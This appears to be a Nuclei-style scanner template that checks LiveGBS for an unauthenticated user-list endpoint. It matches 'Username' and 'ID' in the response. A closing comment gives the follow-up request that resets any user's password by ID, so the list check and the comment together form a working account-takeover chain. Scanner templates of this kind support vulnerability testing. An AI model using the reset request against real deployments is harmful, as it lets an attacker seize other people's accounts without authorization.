id: LiveGBS-list-resetpassword
info:
  name: Template Name
  author: wangzong
  severity: high
  description: LiveGBS部分接口存在未授权访问导致，可以通过组合漏洞修改任意用户密码
  reference:
    - https://github.com/wy876/POC/blob/299ba35f3060728286cf1b0b201bab5aa6c1beb9/LiveGBS/LiveGBS%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E.md
  tags: tags
http:
  - method: GET
    path:
      - "{{BaseURL}}/api/v1/user/list?q=&start=&limit=10&enable=&sort=CreatedAt&order=desc"

    matchers:
      - type: word
        part: body
        words:
          - 'Username'
      - type: word
        part: body
        words:
          - 'ID'
#通过获取的id更改用户密码/api/v1/user/resetpassword?id=22&password=123456